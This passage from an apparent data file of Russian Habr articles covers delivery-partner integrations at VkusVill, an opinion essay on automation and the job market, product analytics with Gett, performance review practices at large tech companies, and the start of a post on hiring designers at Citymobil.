друг друга как по маслу. Например, был вопрос с форматом адресов. Кому-то обязательно нужно, чтобы отдельно выделялись подъезд, квартира и этаж, а кому-то достаточно указать все это в комментарии. Опять же, авторизация и личный кабинет у каждой службы работает по-своему.\n\r\nИ как правило, API не всегда описывает все возможные случаи, которые могут произойти в процессе промышленной эксплуатации. Поэтому бэклог у нас полон, но нет таких задач, для которых не находится решение.\n\nКоманда\r\nКак всегда, за любым процессом стоят люди. Мы в Автомаконе считаем, что для реализации непосредственно технической части интеграции с внешним партнером хватит трех человек: аналитика, специалиста по PHP, который пишет аутентификацию с партнером и все методы, обрабатывает запросы партнера и прочее, и программиста SQL, который полученную информацию раскладывает по нужным таблицам и так же по запросу партнера, транслируемому через через PHP в корневую процедуру, возвращает ему нужную информацию. Собственно, в таком составе мы и работаем.\n\r\nИногда возникают ситуации, в которых нам нужна помощь коллег. Тогда мы можем взять «напрокат» специалиста из той области, в которой у нас произошел затык. Такой обмен работает в обе стороны и помогает нам быстрее добиваться результатов.\n\r\nМы работаем по Agile: три раза в неделю проводим утренние стендапы по задачам и их статусам, определяя их приоритеты, проводим встречи с заказчиками и ретроспективы у команд. В общем, весь тот классический набор, который подразумевает эта методология, старались не придумывать чего-то своего и не переписывать Agile под себя…\n\r\nИнтеграция с внешними партнерами — это только верхушка айсберга. Есть еще интеграция с контрагентами, поставщиками, нашим сайтом и мобильным приложением. Сейчас мы идем по пути распределения информации между базами, и интеграции внутри компании тоже стали востребованы. Во весь этот процесс у нас вовлечены 13-14 человек, плюс люди из управления электронной коммерции, которые нам ставят задачи. А мы, в свою очередь, выбираем методы их реализации.\n\r\nПри этом сказать, что интеграционный процесс — это работа одной, хоть и большой, команды, нельзя. За работой всей системы в целом стоит множество команд, отвечающих за фронт, архитектуру системы, структуру наших внутренних документов и другие важные вещи.\n\r\nНе стоит забывать и об админке, где можно посмотреть любой заказ, время его создания, проследить его путь и узнать службу, которая этот заказ будет доставлять. Также через админку мы передаем информацию о такси: номер автомобиля, имя таксиста и прочее.\n\nЧто ещё\r\nИнтеграция с внешними партнерами — сложный процесс, во многом потому что здесь не все зависит от разработчика. Партнеры — это два больших бизнеса, и чтобы внести какие-то изменения в процесс, нужно приложить много усилий всем сторонам. Да, работа с весовыми товарами все еще далека от идеала и требует доработки. Но интеграции уже проведены, мы их развиваем и заказы приезжают к клиентам. И я очень надеюсь, что большинство из них довольны.\n\r\nПараллельно мы развиваем совершенно новое для нас направление, которое считаем перспективным.\n\r\nЗдесь перед нами открывается внушительный спектр задач. Проектирование каталогов и размещение данных в ситуации, когда мы одновременно и сами выступаем маркетплейсом, который принимает товары, и отдаем сторонним партнерам информацию о себе. Возникают мощные потоки данных, которыми нужно грамотно управлять.\n\r\nГлобально для «ВкусВилла» приоритетная задача сейчас — это оптимизация механизмов доставки товаров до конечного покупателя. Наша команда также вовлечена в этот процесс и работает над геомодулем, который определяет самый оптимальный путь и способ доставки корзины покупателя в зависимости от ассортимента.\n\r\nЭто огромный блок задач, куда входит и работа с координатами, и оптимизация маршрутов, учет городского трафика и расчет оптимальной нагрузки на службу доставки. Которые тоже нужно совершенствовать.\n\r\nО чем из внутренней работы вам было бы ещё интересно почитать?", {"day": "29", "month": "октября", "time": "12:30"}, {"rate": 14, "views": 2000}], ["Надеюсь, получился достаточно \"кричащий\" заголовок, что бы привлечь твое внимание.  В этом материале я предлагаю свои рассуждения на тему того, как рынок труда будет меняться в ближайшем будущем. Я не претендую на истинность, на документальность, на высокий уровень понимания экономики, еще на что то, что может вызвать ярую критику. Я обычный представитель профессии - если такой расклад устраивает - добро пожаловать под кат!А повествование начнется с того, как я пытался позвонить в банк. Если бы мне 5 лет назад кто-то сказал, что я буду спорить с роботом - я бы покрутил у виска. Пришлось придумывать странные вопросы (к тому же на иностранном языке), что бы автоответчик все-таки переключил меня на оператора. Знакомая история?Итак, наверное стоит ответить на вопрос - что же натолкнуло меня на рассуждения подобного рода? - Отчасти безработица во время пандемии, отчасти то, что некоторым все-таки повезло, отчасти моя зависть (белая и пушистая) к тем, кто зарабатывает на жизнь видеосъемкой с дронов. Кто не мечтал о самолетике на пульте управления в детстве?Скелет моих рассуждений следующий:Все новое что с нами происходит - уже когда-то происходило.Если просто раздавать деньги - все умрут с голоду, потому что производство остановится.Все в мире меняется очень быстро - но не стоит этого бояться.Никакой конспирологии. Хотя, как хочется пошутить про налог на воздух - 0.5 шек. за маску в день или 500 шек. штрафа))Первое, о чем хочется сказать - это об очередном кризисе. Конечно, можно достаточно долго рассказывать про то, как с помощью долговых обязательств осуществляется рост экономики и почему кризис - неизбежность. Долг, словно за руку, ведет нас к экономическому кризису. Важно только то, что он будет. Был 10 лет назад и 20 лет назад тоже был и 30. И будет через 10 лет, если система не поменяется.И самое интересное - это как этот кризис повлияет на нас, на людей, как поменяется жизнь и быт. Надо сказать, что все останутся живы, ну почти все, и все будет замечательно. Каждый кризис сопровождается глобальными изменениями на рынке труда и все мы, в той или иной степени, в этом плане в опасности. При чем тут великая депрессия, тогда ведь даже не было интернета? А дело в том, что тогда, как на мой взгляд, произошел ровно тот же процесс, что и происходит сейчас, как на рынке IT, так и вообще на всех рынках современных сфер деятельности. Для тех, кто не помнит, времена великой депрессии сопровождались таким процессом как автоматизация труда на производствах. Денежные ресурсы стали перераспределяться от среднего класса к тем, кто владел производствами и тем, кто умел эти производства создавать. Полки магазинов были завалены товарами, но не у кого не было денег что бы их купить, а тот малый процент у которого деньги были не могли обеспечить нужный уровень потребления. Экономика рухнула! И потом начался сложный процесс ее восстановления. Да настолько сложный, что даже отменили \"сухой закон\".Ладно, так чему вся эта история может нас научить? Для начала хочется понять были ли те, кто смог выйти, ну скажем не сухим из воды, но на хорошем счету из этой всей ситуации и как поменялась деятельность людей? Были! Те люди, у которых не было долговых обязательств, было достаточно ресурсов и они смогли грамотно ими распорядиться и сохранить. Да, они тоже многое потеряли, но в последующем, в условиях голода, даже те ресурсы которые остались - стали цениться намного выше, ведь всем хотелось заработать, что-то кушать и где-то жить. Ну а как поменялась сфера деятельности? На заводах больше не было механического труда (имеется ввиду в старом понимании, когда один рабочий закручивал одну гайку весь день). На заводах потребовался не просто рабочий труд, но инженеры. Сильно стала расти сфера услуг и продаж. Идея изобретения стала захватывать умы все большие. Нужно сказать, что сложные и высокооплачиваемые профессии не исчезли. Исчезли только самые примитивные, а более сложные просто видоизменились.Вообще это нормально, что мир не стоит на месте и все меняется. Но когда появился компьютер, все предвещало, что бухгалтеры просто вымрут. Нет не вымерли, кроме тех кто не смог расстаться со счетами. Просто пересели за компьютеры и стали намного производительнее.Вообще говоря с 20х годов прошлого века по сегодняшние дни, как на мой взгляд - век оптимизации, и компьютерная эра этому очень поспособствовала. Она дала нам целую кучу профессий и отраслей.Но почему же сейчас весь этот ужас и одновременно успех должен повториться? Происходит смена технологии. Последние 20 лет существовали как и компьютеры, так и старые методы. Технологии некогда не сменяются моментально, но сегодня переломный момент. Происходит автоматизация умственного труда. Так же как ручной труд заменялся роботами - умственный заменяется алгоритмами. Мало того, что завершился 100 летний экономический цикл, мало того, что мы освоили технологию ML, которая позволяет создавать нам алгоритмы, которые мы сами хрен знает как работают - лишь бы данные были, так еще и COVID.Ну хорошо скажете вы, а где доказательства? А они есть и уже в вашей голове, а я просто их перечислю. Раньше, таксист - была очень квалифицированная работа, нужно было отлично знать город, иметь опыт предсказывать пробки, знать где \"ловить\" клиента - сейчас все делают алгоритмы Яндекс, Gett и других, а автопилот не за горами. Большинство кол-центров тоже скоро не будет, и я говорю не про автоответчики банков, а про чат боты которые похайповали, про них все забыли, а теперь они уже в новой концепции заходят в этот рынок труда, к примеру SmartAPP позволят даже самым маленьким бизнесам почти полностью автоматизировать общение с клиентом. Этот тренд приходит даже на наше с вами поле игры, коллеги-программисты. Все джуны и те, кто в основном выполняют типовые задачи в опасности и мы сами способствуем этому (и я не собираюсь останавливаться и не кому не советую). Единственное, что хоть немного меня успокаивает, так это то, что сектор технологий растет быстрее, чем сам себя автоматизирует. Но так не будет продолжаться вечно.Хорошо, предположим, ты, мой дорогой читатель поверил мне (надеюсь я был убедителен). Так а что делать. Начнем с того, что я не умею в точности предсказывать будущее, но если оглянуться в прошлое, то можно будет увидеть следующую картину. Такие технологические изменения забирают у нас лишь одну способность - исполнять определенные, пускай даже сложные механики. Все хоть немного сложные профессии останутся, просто немного поменяется сам процесс (как с бухгалтерами). К примеру существует алгоритм способный по картинке верстать веб страницы, но верстальщики не вымрут, потому, что анимации для кнопок без них не кто не сделает и запросы на сервер некто не прикрутит.А лидерами рынков станут сферы где присутствует сложные и динамические потребности, потому что машина без запроса - бесполезный ящик, а еще эти машины нужно научить. На мой взгляд основным изменением станет то, что все меньшим значением будет обладать что человек умеет и большем, какими свойствами он обладает.А дальше что? Если опять-таки оглядываться назад. то где то в 40-50х годах человечество изобретет что то невообразимое, что по все той-же s-образной кривой снова изменит наш мир!А это мой субъективный список тех свойств, которые будут востребованы следующие 20 лет:Сфера обучения - мир будет меняться так быстро, что слово \"профессия\" исчезнет и нужно будет вечно учиться, человек имеет отличное свойство понимать новое и объяснять его учитывая индивидуальность.Сфера науки и исследований - машины должны не только собирать информацию, но и правильным способом её осмыслять, без исследователей и ученых она осмыслит её не правильно.Сфера креатива, изобретений, и всего, где нужно выходить за рамки алгоритма - она останется востребованной, однако мы больше не будем создавать продукт, а будем создавать способ его создать. Сфера развлечений - людям нужно общение, живое! Оно заложено природой и машина еще не скоро сумеет добраться до наших эмоций и чувств.Предпринимательство - все еще лучше человека никто не понимал потребности человека, к тому же если учесть, что часто мы сами не знаем что нам нужно (Отсылка к цитате великого Джобса)Ну и последнее - напишите в комментариях, что приходит на ум.Нужно сказать, что это лишь размышления призванные заставить задуматься. На этом все, всем добра!P.S. Ух тыж. Настолько увлекся, что создал чат бот цель которого помочь устроиться на работу. Там затронуты базовые вещи - кем устроиться, как сделать резюме, как получить поток приглашений, как договориться о зарплате, какую финансовую цель ставить. Я сделал это абсолютно бесплатно, без рекламы и других каких то уловок. Короче не ставил перед собой никаких коммерческих целей, а просто осуществил порыв души. (Не реклама!)  Милости прошу на оценку: t.me/Worktubebot", {"day": "17", "month": "октября", "time": "05:49"}, {"rate": -24, "views": 9400}], ["Мало какая отрасль современного бизнеса способна обойтись без продакт-менеджмента. Представители этой профессии играют важнейшую роль в разработке продукта, начиная от анализа рынка и заканчивая созданием прототипа или финальным релизом. Чем больше опыта, тем больше возможностей. Так, senior product manager — это комплексная роль, с высокой степенью ответственности, свободы и очень обширными навыками.\n\r\nЧто касается обучения, то эффективнее всего закреплять теорию практикой. Именно поэтому GeekBrains проводит брендированные четверти, привлекая опытных практиков из разных компаний. Программа и материалы третьей четверти курса Product Manager, аналитика в управлении продуктом, подготовлены вместе с Gett — компанией, известной своим data-driven подходом к развитию продуктов. В нюансах аналитики помог разобраться Игорь Полянский, Head of Analytics Gett.\n\nТеатр начинается с вешалки, а аналитика — со сбора данных\r\nСобирать данные нужно не ради получения какой-то абстрактной информации. В ходе сбора нужно отталкиваться от задачи, которую продакт планирует решить при помощи этих данных. Например: проанализировать результаты MVP продукта или сделать продуктовый ресерч для оценки нового функционала этого продукта. Это две разные задачи, поэтому и метрики успеха будут отличаться.\n\r\nЛишь сформулировав их, можно оценить набор и объем данных, который нужен для расчета метрик. После этого можно приступать к следующему этапу — переходу к настройкам сбора данных. Задача осложняется тем, что нужно подумать над ближайшими перспективами, оценив, какая информация понадобится через месяц, квартал, год.\n\r\nДля сбора используется большое количество инструментов — от корпоративных продуктов вроде Mixpanel, который используется Gett, до самых разных самописных решений. Важно понимать, что чем больше данных нужно собрать, чем они подробнее, оперативнее, тем дороже обойдется решение этой задачи. Как и во всех других случаях, нужно соблюдать баланс между качеством данных и их стоимостью.\n\r\nК слову, аналитика очень сильно шагнула вперед за последние 10 лет. Развитию способствует снижение стоимости хранения данных, что дает возможность компаниям накапливать информацию по взаимодействию пользователя с продуктом и анализировать ее. С увеличением объема данных появились и эффективные инструменты продуктовой аналитики, которые позволили анализировать большинство типовых анализов, которые ранее делались вручную. Сейчас процесс анализа, который ранее был доступен лишь аналитикам, продакт-менеджер может провести в несколько кликов. Соответственно, аналитики занимаются более важными и сложными исследованиями, необходимыми для продвижения продукта. \n\nПотом — формулируются гипотезы\r\nНо мы отвлеклись, вернемся к продакт-менеджменту и этапам работы. Главное сырье продуктовой команды — гипотезы. Они формируются в процессе исследования клиентов, погружения в метрики и проверки других гипотез. Например, «разработав функционал А, мы сможем заработать больше денег». И здесь появляется множество дополнительных вопросов:\n\n\nПочему мы заработаем больше денег?\nКакую группу пользователей затронут изменения, связанные с добавлением функционала?\nКак пользователи из этой и других групп отреагируют на изменения?\nКакая метрика может вырасти и по какой причине?\nНе ухудшит ли новый функционал другие метрики? Если да, то почему?\n\r\nВопросов может быть и больше, и только ответив на них, можно переходить к проверке этих гипотез и реализации новых фич. Без описанной выше логической структуры в голове продакт — скорее визионер, чем специалист, который в состоянии отвечать за свой продукт.\n\r\nСами посудите — 95 % продуктовых фичей заканчиваются неудачей, это печальный рыночный факт. Почему так? До сих пор множество решений принимается не на основе данных и логики, а на основе видения продакт-менеджера. Например — «у конкурентов эта функция есть, значит нам она необходима». Делать так следует в последнюю очередь. Лучше — рассчитать как действительную цену, так и потенциальный эффект от разработки. Идея построения правильного мышления и процесс работы с гипотезами крайне важны.\n\nЧто дальше?\r\nДалее следует постановка и планирование задач для разных отделов, включая разработчиков. На этом этапе создаются пользовательские истории и задачи, формируются спринты и распределяются задачи по разным командам, работающим над продуктом. Тестируются различные версии продукта, включая прототипы, демо-версии и полностью готовые решения. \n\r\nРезультаты тестов анализируются, после чего формируются выводы. Кстати, именно на этом этапе проводится А/Б тестирование, о котором мы говорили в одной из ранее опубликованных статей. \n\r\nЧто касается практических кейсов продакт-менеджмента, то вот один из них, кейс Gett по изменению прогноза времени прибытия машины до места посадки. Это яркий пример того, как простое решение может привести к интересным результатам.\n\r\nПродолжительное время подачи машины клиенту компании прогнозировалось с точностью до минуты. Выяснилось, что если реальное время оказывается хотя бы на минуту больше прогнозного, клиенты расстраиваются. Это оказывает негативное влияние как на его поведение, так и на дальнейшие метрики.\n\r\nСпециалисты компании предположили, что изменение прогноза времени подачи машины с точного на интервал позволит исправить эту ситуацию. Так и получилось — после того, как приложение стало показывать время подачи, как, например, «меньше 5 мин» вместо «2 минуты», уровень удовлетворения клиентов сервисом увеличился. В конечном итоге конверсия выросла на 1 процентный пункт. При объемах поездок в Gett речь идет о миллионах долларов США.\n\nБазовый багаж знаний продакт-менеджера\r\nЭкспертом во всех смежных отраслях продакт-менеджеру быть не нужно. Например, в ходе работы не обязательно использовать сложные математические инструменты. Нужна, прежде всего, база статистики для того, чтобы понимать результаты анализа и уметь принимать на их основе правильные решения. Продакт-менеджеру достаточно базовых знаний, вроде умения отличать медиану от среднего, процент от процентного пункта, корреляцию от причинно-следственной связи. Это знания, необходимые каждый день.\n\r\nА еще очень полезно знать основы вероятностей, это позволяет прокачать «продуктовое мышление», правильно оперировать фактами, разбираться в метриках и формулировать гипотезы. У грамотного продакт-менеджера, который слышит чей-либо доклад, например, о средней зарплате в Москве, сразу возникает ряд вопросов, включая «Почему средняя? А покажите нам распределение».\n\r\nЕще очень желательно хотя бы на базовом уровне разбираться в SQL. В частности, нужно понимание логики написания запросов и умение работать с основными функциями. Это помогает очень быстро проверять гипотезы без привлечения аналитика.\n\r\nВажно хорошо разбираться и в инструментах визуализации данных. Так, для day-to-day анализа проще использовать хорошо знакомые всем инструменты вроде Excel или Google Sheets. А вот для построения регулярных отчетов нужно что-то более мощное, инструменты бизнес-аналитики. Понимание логики их работы позволяет грамотно ставить задачу аналитику, или даже делать простые отчеты под свои нужды.\n\r\nЧто касается перспектив профессии, то эксперты положительно их оценивают. В ближайшем будущем специальность «продакт-менеджер» будет становиться все более востребованной, несмотря на текущий кризис. И это касается не только сферы информационных технологий, но и ритейла, банковской сферы и других отраслей.", {"day": "2", "month": "июня", "time": "13:52"}, {"rate": 26, "views": 1700}], ["Каждый руководитель сталкивается с вопросами: \n\n\nКак повысить производительность команды, чтобы за то же время делать в полтора раза больше? \nКак замотивировать, чтобы люди горели своей работой?\nКак в ценном сотруднике распознать слабые стороны и дать ему развивающий фидбэк?\nКак объективно оценить, кого стоит повысить, поднять зарплату и наградить премией, а кому подыскать замену?\n\r\nУ всех есть персональные рецепты, но как подходят к решению этих проблем самые успешные IT компании? Задавшись этим вопросом, я изучил практики Google/Microsoft/Adobe/Netflix/Intel.\n\r\nУ всех в том или ином виде присутствует 4 составных компонента:\n\n\nCulture Fit Evaluation (e.g. Googleness/Netflix culture code)\nOKR (objectives and key results)\nPeer Review\nPerformance Review\n\r\nРассмотрим их подробнее.\n\nОценка на соответствие культурным ценностям (Culture Fit)\r\nНасколько человек следует ценностям компании. Как он достигает своих целей. Это то, что не всегда легко описать, но легко распознать в человеке. Например: стратегическое мышление, открытость в общении, любопытство, смелость в принятии решений, страсть к своему делу, целостность, ориентированность на результат. Ласло Бок, старший вице президент People Operations в Google, описывает это так:\nТакие качества как любовь повеселиться (а кто не любит?), определенный уровень интеллектуальной скромности (тяжело учиться, если ты не можешь признать, что можешь быть не прав), высокий уровень сознательности (мы ждем совладельцев, а не исполнителей), комфорт с неопределенностью (мы не знаем как изменится наш бизнес) и подтверждение, что вы выбрали несколько смелых или интересных путей в своей жизни. Вот тут более подробные описания культурных ценностей Google, Netflix, Amazon.\n\nObjectives and Key Results (OKR)\r\nOKR (objectives and key results)  -  система постановки измеримых целей внутри компании. Эту концепцию впервые описал Энди Гроув, CEO Intel. Ларри Пейдж, сооснователь Google, сказал, что OKR не раз помогала им расти десятикратно. Вдохновившись успехом Google, систему таже стали использовать Linkedin, Twitter, Gett и Uber.\n\r\nЗадача OKR  -  соединить глобальные цели компании с командными/персональными целями каждого сотрудника.\n\r\nКлючевые особенности:\n\n\nцель должна быть измеримой;\nкороткие циклы планирования (месяц/квартал/год);\nпростота. В современных компаниях цели могут пересматриваться очень часто, реагируя на изменения рынка. Процесс планирования должен быть максимально легким и быстрым;\nпрозрачность. OKR компании/команд/сотрудников публично доступны внутри компании;\nдвунаправленная постановка целей. Около 60% целей ставятся командами самостоятельно, исходя из общих задач компании;\nрегулярная межкомандная синхронизация. Например короткие, еженедельные стендапы между командами;\nинструмент управления, а не оценки. Само по себе выполнение OKR не влияет на результаты Performance Review. Это один из источников данных, дающих представление о качестве работы сотрудника.\n\nОценка другими сотрудниками (Peer Review)\r\nНа этом шаге сотрудник получает разностороннюю оценку от нескольких источников: членов команды, руководителя, подчиненных, сотрудников других отделов. Это помогает повысить объективность оценки по сравнению с подходом, когда сотрудника оценивает только непосредственный руководитель.\n\r\nШироко известный инструмент  -  Overview 360. По данным Forbes его используют более 85% компаний из Fortune 500.\n\nОценка производительности (Performance Review)\r\nФинальный шаг. Здесь анализируется данные собранные на предыдущих этапах, и на их основе происходит оценка. Дальше сотруднику дается фидбэк и принимаются решения о вознаграждениях.\n\nКак это устроено в Google?\r\nРассмотрим процесс Performance Review на конкретном примере компании Google.\n\r\nОн состоит из 4-x этапов:\n\n\nсамостоятельная оценка (Self evaluation);\nоценка 360 градусов (Overview 360 degrees);\nкалибровка (calibration);\nпрезентация результатов (Outputs).\n\nСамостоятельная оценка (Self evaluation)\r\nСотрудник сам себя оценивает по шести критериям (по пятибалльной шкале от «никогда не проявляю» до «проявляю всегда», с предложением поделиться примерами, подтверждающими эти оценки). Дальше по этим же критериям его будут оценивать коллеги.\n\n\nGoogleyness  -  соответствие ценностями Google. Это основной компонент по оси «Как».\nРешение проблем  -  аналитические навыки, применяемые в рабочих ситуациях.\nИсполнительность, автономность  -  способность качественно выполнять работу без необходимости частого контроля со стороны менеджмента и коллег.\nИнтеллектуальное лидерство  —  насколько сотрудник является авторитетом в своей области. По мере роста компании, сферы компетенций могут сужаться, но при этом Google ожидает, что сотрудники являются экспертами в своих направлениях: обучают коллег через tech-talks, обучают клиентов, создают высококачественный контент.\nСитуационное лидерство  —  несмотря на то, что многие молодые Гуглеры имеют мало опыта руководства командами (или не имеют совсем), от каждого требуется проявлять навыки ситуационного лидерства. Например, брать на себя ответственность за проблему или проект, проявлять проактивность и лично отвечать за конечный результат.\nВлияние  -  умение быть услышанным в большой, растущей компании, что тесно перекликается с ситуационным лидерством.\n\r\nДальше оцениваемый сотрудник кратко описывает свои проекты и достижения за последний год (самую суть, размер текстового поля ограничен 512 символами). Это описание будет дальше передано ревьюверам для их оценки вклада сотрудника в каждый из пунктов.\n\nОценка 360 градусов (Overview 360)\r\nНа этом этапе важно правильно выбрать людей, которые будут проводить оценку. Сотрудник сам предлагает шортлист, который обсуждается и валидируется вместе с руководителем. Принимается во внимание то, насколько тесно оцениваемый и потенциальные ревьюверы взаимодействовали по проектам и насколько хорошо тот или иной ревьюер сможет дать объективную оценку. От ревьюверов требуется следующее:\n\n\nотметить сильные стороны оцениваемого;\nотметить стороны, над которыми нужно поработать;\nдать оценку по каждому из 6 пунктов из этапа self-evaluation;\nоценить степень вклада в те проекты, которые оцениваемый сотрудник сам указал на предыдущем этапе.\n\r\nТакой подход заменил многостраничную форму, которая использовалась изначально, что привело к сокращению среднего времени проведения этого этапа более чем на 25%. Плюс увеличилась доля участников (с 49% до 75%), которые посчитали этот этап полезным.\n\nКалибровка (Calibration)\r\nПосле того как собраны результаты самостоятельной оценки, оценок коллег и достижения по OKR , руководители готовят черновик рейтинга, имеющий шкалу:\n\n\nнуждается в улучшении;\nсоответствует ожиданиям;\nпревосходит ожидания;\nсильно превосходит ожидания;\nпревосходный.\n\r\nДальше начинается процесс калибровки. Как описывает этот процесс Ласло Бок:\n\nОснова оценки производительности  -  это калибровка. Менеджер предлагает предварительный рейтинг для сотрудника, например «превосходит ожидания», основываясь по большей части на результатах выполнения OKR. Также он принимает во внимание другие факторы, например, количество проведенных интервью или иные внешние обстоятельства, такие как изменения экономических условий, повлиявшие на выручку. Перед тем как оценки становятся финальными, группа менеджеров собирается вместе и проводит ревью всех предварительных оценок. Группа из пяти до десяти менеджеров встречается и проецирует на стену результаты от пятидесяти до тысячи сотрудников, обсуждают каждого персонально и договариваются о честных оценках. Это позволяет нам убрать давление, которым руководители могут подвергаться от подчиненных для завышения рейтингов. Также это помогает убедиться, что результат перекликается с общими ожиданиями производительности, т.к. часто менеджеры имеют разные уровни ожидания от других людей и интерпретируют стандарты производительности в своей собственной уникальной манере. Калибровка повышает объективность за счет того, что заставляет менеджеров защищать свои решения друг перед другом. Что также увеличивает ощущение справедливости оценки среди сотрудников.\r\nЕсли в процессе калибровки выявляются слишком «суровые» менеджеры, то на их оценку делается скидка (также актуально и для череcчур «мягких»).\n\nПрезентация результатов (Outputs)\r\nПосле того как оценка финализирована  -  руководители проводят с каждым сотрудников две встречи: одна для предоставления обратной связи, вторая для обсуждения прибавок зарплат, бонусов и повышений. Эти два разговора разнесены на разные встречи с перерывом, как минимум, в месяц.\nПрисутствует негативная динамика, когда за одну встречу сотрудникам объявляют результаты оценки и говорят о повышении зарплаты. Сотрудники фокусируются на внешней награде - повышении и высоком рейтинге, и в этот момент учебная составляющая упускается. У нас есть простое решение. Никогда не обсуждать вознаграждения и результаты оценки в одно и то же время. Результаты ежегодной оценки предоставляются сотрудникам в ноябре, а вознаграждения обсуждаются месяц спустя.\nДругие подходы\r\nУ подхода Google есть недостатки: сбор, обработка, объявление результатов  -  довольно затратный по времени процесс (в больших компаниях ежегодно на это уходят тысячи часов). Из-за этого делать его чаще чем раз в год довольно проблематично. При этом давать фидбэк сотруднику раз в году  —  слишком редко. Поэтому во многих компаниях (например, Amazon, Adobe, Deloitte) есть тенденция сокращать количество вопросов, делая этот процесс максимально простым и гибким, чтобы можно было собирать фидбэк прямо на лету.\n\r\nНапример в Deloitte, вместо того, чтобы проводить review раз в год, после каждого завершенного проекта руководитель отвечает на 4 вопроса по каждому сотруднику:\n\n\nИсходя из того, что я знаю об эффективности сотрудника, и если бы это были мои деньги, поднял бы я ему зарплату и выплатил бы максимально возможную премию? (оценивается общая эффективность и уникальная ценность для проекта по пяти-уровневой шкале от «точно да» до «точно нет»).\nИсходя из того, что я знаю об эффективности сотрудника, буду ли я прилагать усилия, чтобы он работал в моей команде? (оцениваются навыки командой работы по такой же пятиуровневой шкале).\nНаходится ли сотрудник в зоне риска как низкоэффективный? (идентифицируются проблемы которые могут навредить заказчику или команде в формате да/нет).\nГотов ли сотрудник к повышению прямо сейчас? (оценивается потенциал в формате да/нет).\n\nВыводы\r\nНа выходе у каждого сотрудника есть понятные/измеримые цели, ему прозрачны критерии, по которым он будет оценен своими коллегами и руководителем. Он знает о своих слабых сторонах над которыми нужно работать. Он замотивирован на высокую производительность, так как понимает, что результаты его работы напрямую коррелируют с оценкой и вознаграждением. В коллективе есть ощущение справедливости финансовых вознаграждений и карьерных повышений. \n\r\nКонечно, у Performance Review есть и недостатки. Даже в лучших компаниях значительная доля сотрудников (больше 25%) недовольна системой оценки. Но лучше иметь несовершенную систему, чем не иметь ее вовсе. Тут важно получить сильную поддержку высшего руководства, анализировать результаты и постоянно искать пути улучшения этой системы.\n\nДополнительные материалы\n\nPerformance Management at Google by Francisco S. homem de Mello\nHow Google sets goals: OKRs Google Ventures partner Rick Klau\nHow Netflix Reinvented HR by Patty McCord\nDeath of the Perfomance Review: How Adobe Reinvented Perfomance Management and Transformed Its Business by Donna Morris\nHow Microsoft Refashioned Its Performance Management\nMicrosoft performance reviews used to be hypercompetitive 'stack rankings by Sherin Shibu\nReinventing Performance Management by Marcus Buckingham and Ashley Goodall\nHow Accenture, Microsoft And Deloitte Replaced Annual Performance Reviews by Bernard Marr\nAn Ex-Google Employee Explains What It Means To Be 'Googley' by Jens Oliver Meiert\nNetflix Culture\nAmazon Leadership Principles\nOKR для начинающих, Фелипе Кастро\nHow Effective Are Your 360-Degree Feedback Assessments? by Jack Zenger\nHigh Output Management, Andrew S. Grove", {"day": "7", "month": "мая", "time": "21:57"}, {"rate": 7, "views": 12000}], ["В Ситимобил три подразделения продуктового дизайна: райдер, драйвер и бэк-офисы, и для каждого из них нужно подобрать людей, которые будут решать свои специфические задачи.\n\nКто вообще откликается и кого мы ищем\r\nОтбор кандидатов даже для каких-то первичных собеседований — достаточно трудоемкий процесс. Он занимает много времени руководителей подразделений и сотрудников службы рекрутмента. \n\r\nОткликов много, а релевантных очень мало. В итоге всех кандидатов можно разделить на несколько групп:\n\nНерелевантные. Иллюстраторы, художники, дизайнеры промо/коммуникаций. Здесь возможны два варианта развития событий: либо люди совсем не понимают, о чем идет речь, а просто кликают на вакансию и ждут, что их позовут на интервью — такие кандидаты сразу получают отказ. Либо это люди, которые понимают, что не совсем подходят, но хотят сделать определенный сдвиг в карьере в сторону дизайна продукта. Здесь все индивидуально: бывают классные ребята, с которыми как минимум стоит пообщаться на будущее, а бывают те, кто напрашивается на тестовое, потому что хотят прокачивать себя таким образом, и им важно получить обратную связь. В обоих случаях это отличный задел на будущее: можно познакомиться с человеком, рассказать ему о компании, дать обратную связь и помочь более структурно подойти к процессу перехода в новую специальность. А еще положить его в резерв и пообщаться через год.\n\nJunior/Interns. Совсем начинающие специалисты, которые окончили курсы «стань UX-дизайнером за 3 недели и получи работу от %сумма_денег%». С этими ребятами бывает по-разному, но в основном это не наш профиль. Такие кандидаты чаще всего имеют неплохие заделы в графическом дизайне, но совершенно не представляют себе специфику работы внутри продуктовых команд с большим количеством взаимодействия и коммуникаций. Если находится хороший кандидат, с ним стоит познакомиться и тоже положить в резерв.\n\r\nВ будущем, когда мы будем готовы открыть программы для стажеров, мы с удовольствием возьмем таких ребят и поможем им развиваться.\n\nMiddle. А вот тут уже становится интереснее, в эту категорию попадают самые разные специалисты: от UI-дизайнеров до дизайнеров, которые уже поработали в продуктовых компаниях. \n\r\nЧасто по портфолио, сопроводительному письму и даже компаниям в резюме сложно понять, какие задачи человек выполнял. На этом уровне нужно детально разбираться, что же там делал человек, как были организованы процессы, какая была структура команд, как распределялись в них роли участников, и какова была роль самого дизайнера. Тут надо копаться и пытаться найти то, что тебе нужно. Чаще всего на этом и предыдущем уровне есть определенная переоценка собственных навыков и стоимости.\n\nSenior. Такие специалисты редко откликаются на вакансии. Понятно почему — у них нет проблем с работой. В 99% случаев работа находит их сама. Хотя бывают и отклики, но это скорее история про сарафанку: когда через знакомых люди узнают о нас, у них появляется определенный кредит доверия, и они уже идут через вакансию к нам для стартового общения. Найм таких дизайнеров проходит предельно просто: люди знают, чего хотят, и вы либо сразу понимаете, что у вас мало общего (в целом или конкретно сейчас), либо все стадии найма проходятся быстро и безболезненно.\n\nSenior+. Одна из самых непонятных категорий. Специалисты этого уровня порой просто теряют мотивацию, где-то пытаются попробовать себя руководителями, хотят быть больше продукт-менеджерами, работать три дня в неделю или еще что-то. Тут все очень сложно с психологией людей и их личными мотивами, при этом такие кандидаты легко могут пройти технические интервью, но в какой-то момент общения вы понимаете, что человек не готов к постоянной работе и просто может выгореть за несколько месяцев.\r\nВ каждой из этих групп есть большое количество нюансов, вопросов, темных пятен. Мы регулярно обновляем наш процесс общения с кандидатами, как только видим какие-то систематические закономерности или проблемы.\n\nКак мы строим диалог с кандидатом\r\nТак как мы молодой IT-бренд, нам важно построить коммуникацию с кандидатом правильно:\n\nСделать общение комфортным. Это правда важно. Мы со своей стороны стараемся быть максимально прозрачными и отвечать на все вопросы детально, чтобы у человека было полное представление об устройстве работы у нас.\n\nОбеспечить обратную связь. Часть кандидатов отпадает на этапе просмотра резюме и портфолио, часть после первого собеседования, кто-то после тестовых заданий. Чем дальше мы с кандидатом прошли по воронке, тем более развернутый фидбек мы постараемся ему дать: детально разбираем решение, рассказываем про сильные и слабые стороны, рассматриваем 